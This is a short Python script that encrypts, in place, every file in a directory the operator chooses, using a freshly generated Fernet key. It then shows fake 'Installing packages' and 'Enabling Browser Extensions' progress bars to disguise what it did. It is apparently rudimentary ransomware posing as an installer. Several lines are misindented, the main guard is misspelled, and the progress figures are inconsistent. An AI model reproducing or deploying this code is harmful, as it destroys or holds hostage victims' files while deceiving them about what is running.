from cryptography.fernet import Fernet
import time,os

print("!----------------------------------!")
print("!          Made By Mr4zz           !")
print("!----------------------------------!")

download = 2
download1= 4
download2 = 7
download3 = 1

def gnkey():
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
       key_file.write(key)
    
def ldkey():
    return open('key.key','rb').read()

def encrptt(items,key):
    f = Fernet(key)
    for item in items:
        with open (item,'rb') as file:
            fdata = file.read()
            data = f.encrypt(fdata)
            with open(item,'wb') as file:
                file.write(data)
                
                
                
if __name___ =='__main__':
  path = 'Here is the Path You Want to Encrypt' #MODIFY THIS and REMEMBER USE \\
  items = os.listdir(path)
  full_path = [path + '\\'+item for item in items]
  
  gnkey()
  key = ldkey()
  
  encrptt(full_path, key)
  
 print("Succefully Set Up!")

#Perception is Deception, many people look but few people see...

print("Installing packages...")
 print("0MB                                32MB")
 time.sleep(download)
 print("7MB|||||||                         32MB")
 time.sleep(download1)
print("12MB||||||||||||                    32MB")
 time.sleep(download2)
print("27MB|||||||||||||||||||||||||||     32MB")
 time.sleep(download3)
print("32GB||||||||||||||||||||||||||||||||32GB")

print("Installation Complete!")

#Are you a one or a zero?
#that's the question you should be asking yourself

(input("Do you want to enable browser extensions?  (Y/n)"))

print("Enabling Browser Extensions...")
  print("0MB            12GB")
time.sleep(download3)
  print("4MB||||        12GB")
time.sleep(download)
  print("9MB|||||||||   12GB")
time.sleep(0.5)
 print("12MB||||||||||||12GB")
  
  print("The Extension (Name) has been installed correctly.")  #Enter the name you gave to your file here
